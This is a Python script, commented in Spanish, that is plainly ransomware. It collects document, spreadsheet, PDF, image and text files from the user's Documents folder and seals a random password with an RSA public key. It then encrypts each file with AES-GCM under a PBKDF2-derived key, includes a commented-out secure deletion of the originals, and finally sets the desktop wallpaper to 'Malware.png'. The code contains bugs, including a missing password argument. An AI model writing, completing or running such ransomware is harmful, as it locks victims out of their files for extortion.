import os
import secure_delete
import re
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from wallpaper import cambiarFondo
from Crypto.Protocol.KDF import PBKDF2
import base64

llavePublica =  os.getenv( 'LLAVE_PUBLICA')
password = ''
archivos = []
pattern = re.compile(r'.*\.(docx|xlsx|pdf|jpeg|jpg|txt)$')

# Para listar los archivos en la carpeta Documents del usuario
def listar_archivos_documentos(lista):
    documentos_path = os.path.join(os.environ["USERPROFILE"], "Documents")
    for root, _, files in os.walk(documentos_path):
        for file in files:
            if pattern.match(file): 
                lista.append(os.path.join(root, file))

listar_archivos_documentos(archivos)

def generarPassword( llavePublicaPEM ):
    bytesAleatorios = get_random_bytes( 16 )
    password = base64.urlsafe_b64encode( bytesAleatorios ).decode( 'utf-8' )
    llavePublica = RSA.import_key( llavePublicaPEM )
    cipher = PKCS1_OAEP.new( llavePublica )  
    passwordCifrada = cipher.encrypt( password )
    with open( 'password.enc', 'wb' ) as f:
        f.write( passwordCifrada )

def derive_key(password, salt):
        return PBKDF2(password, salt, dkLen=32, count=100000)

def cifrarArchivos(archivos, password, output_extension=".enc"):
    # TODO: Cambiar el header
    header = b"header"
        
    for archivo in archivos:
        with open(archivo, "rb") as f:
            datos = f.read()

        salt = get_random_bytes(16)
        key = derive_key(password.encode(), salt)

        cipher = AES.new(key, AES.MODE_GCM)
        cipher.update(header)

        ciphertext, tag = cipher.encrypt_and_digest(datos)

        output_file = archivo + output_extension
        with open(output_file, "wb") as f:
            f.write(salt)
            f.write(cipher.nonce)
            f.write(tag)
            f.write(ciphertext)
        
        print(f"Archivo {archivo} cifrado como {output_file}")
        # secure_delete.delete(archivo)

cifrarArchivos( archivos )

cambiarFondo("Malware.png")